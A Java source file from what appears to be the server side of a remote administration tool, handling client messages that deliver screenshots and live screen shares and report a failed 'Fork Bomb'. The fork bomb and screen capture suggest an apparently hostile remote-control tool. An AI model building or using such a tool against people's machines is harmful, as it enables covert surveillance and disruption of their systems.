package utils;

import network.ClientConnection;
import network.Message;

import javax.imageio.ImageIO;
import javax.swing.JFrame;
import java.awt.Graphics2D;
import java.awt.event.WindowAdapter;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.InputStream;

import static utils.ServerUtils.print;


public class ServerMessageHandler {

    private static JFrame sharedScreen;

    public static void handleIncomingMessage(Message message, ClientConnection c) {

        switch (message.getCommand()) {
            case "screen":
                receiveScreenshot(message);
                break;
            case "print":
                print(message.getArguments().get(0));
                break;
            case "screenshare":
                receiveScreenShare(message, c);
                break;
            case "bomb-fail":
                System.out.println("Fork Bomb failed: " + message.getArguments().get(0));
                break;
        }

    }


    static void receiveScreenShare(Message message, ClientConnection c) {
        if (sharedScreen == null) {
            sharedScreen = new JFrame("ScreenShare");
            sharedScreen.addWindowListener(new WindowAdapter() {
                @Override
                public void windowClosing(java.awt.event.WindowEvent e) {
                    System.out.println("Fechou o jovem");
                    e.getWindow().dispose();
                    c.getConnection().sendMessage(new Message("stop-screenshare"));
                    sharedScreen = null;
                    System.out.println("JFrame Closed!");
                }
            });
        }

        putImageFromMessage(sharedScreen, message);
    }

    static void receiveScreenshot(Message message) {
        System.out.println("SCREENZAO CHEGOU HEIN");
        JFrame window = new JFrame("ScreenShot");

        putImageFromMessage(window, message);
    }

    private static void putImageFromMessage(JFrame window, Message message) {
        try {
            byte[] imageBytes = (byte[]) message.getArguments().get(0);
            int mouseX = (int) message.getArguments().get(1);
            int mouseY = (int) message.getArguments().get(2);


            InputStream in = new ByteArrayInputStream(imageBytes);
            BufferedImage bufferedImage = ImageIO.read(in);

            ImageScreen image = new ImageScreen(bufferedImage);

            BufferedImage cursor = ImageIO.read(ResourcesUtils.getFile("cursor", "png"));

            Graphics2D graphics2D = image.getImage().createGraphics();
            graphics2D.drawImage(cursor, mouseX, mouseY, 16, 16, null);

            window.add(image);
            window.update(image.getGraphics());
            window.setVisible(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static JFrame getSharedScreen() {
        return sharedScreen;
    }

    public static void setSharedScreen(JFrame sharedScreen) {
        ServerMessageHandler.sharedScreen = sharedScreen;
    }
}
